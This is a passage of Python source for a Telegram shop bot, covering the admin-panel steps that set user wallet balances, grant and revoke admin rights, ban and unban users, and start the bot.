            await message.reply_text("❌ Could not find user. Send valid User ID or Username:")

    elif state == "ADM_STEP_BAL_NEW_VAL":
        try:
            new_bal = float(message.text.strip())
            target_user = temp_data[user_id]["target_user"]
            await set_user_balance(target_user, new_bal)
            user_states.pop(user_id, None)
            await message.reply_text(f"✅ User `{target_user}` balance updated to **₹{new_bal:.2f}**.", reply_markup=get_admin_panel_keyboard(user_id))
            await app.send_message(target_user, f"🔔 **Your Wallet Balance has been updated to: ₹{new_bal:.2f}**")
        except ValueError:
            await message.reply_text("❌ Please enter numbers only:")

    elif state == "ADM_STEP_ADD_SUDO":
        input_text = message.text.strip()
        try:
            new_sudo = await client.get_users(input_text)
            new_sudo_id = new_sudo.id
            await add_sudo_user(new_sudo_id)
            user_states.pop(user_id, None)
            await message.reply_text(f"✅ User `{new_sudo_id}` (@{new_sudo.username or 'No Username'}) has been granted Admin privileges.", reply_markup=get_admin_panel_keyboard(user_id))
            await app.send_message(new_sudo_id, "🎉 **You have been granted Admin privileges!** Use /admin to open the panel.")
        except Exception as e:
            await message.reply_text(f"❌ Failed to resolve user `{input_text}`. Please check the ID/username: {e}")

    elif state == "ADM_STEP_REM_SUDO":
        input_text = message.text.strip()
        try:
            target_sudo = await client.get_users(input_text)
            target_sudo_id = target_sudo.id
            if target_sudo_id == OWNER_ID:
                await message.reply_text("❌ You cannot remove the Owner!")
                return
            await remove_sudo_user(target_sudo_id)
            user_states.pop(user_id, None)
            await message.reply_text(f"✅ User `{target_sudo_id}` admin privileges revoked.", reply_markup=get_admin_panel_keyboard(user_id))
            await app.send_message(target_sudo_id, "⚠️ **Your Admin privileges have been revoked.**")
        except Exception as e:
            await message.reply_text(f"❌ Failed to resolve user: {e}")

    elif state == "ADM_STEP_BAN_USER":
        input_text = message.text.strip()
        try:
            target_user = (await client.get_users(input_text)).id
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (target_user,))
                await db.commit()
            user_states.pop(user_id, None)
            await message.reply_text(f"🚫 User `{target_user}` is now Banned.", reply_markup=get_admin_panel_keyboard(user_id))
        except Exception:
            await message.reply_text("❌ Invalid User ID or Username:")

    elif state == "ADM_STEP_UNBAN_USER":
        input_text = message.text.strip()
        try:
            target_user = (await client.get_users(input_text)).id
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_user,))
                await db.commit()
            user_states.pop(user_id, None)
            await message.reply_text(f"🟢 User `{target_user}` is now Unbanned.", reply_markup=get_admin_panel_keyboard(user_id))
        except Exception:
            await message.reply_text("❌ Invalid User ID or Username:")

# ==================== START SERVER ====================
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    print("🚀 All-in-One Button Shop Bot Activated!")
    app.run()
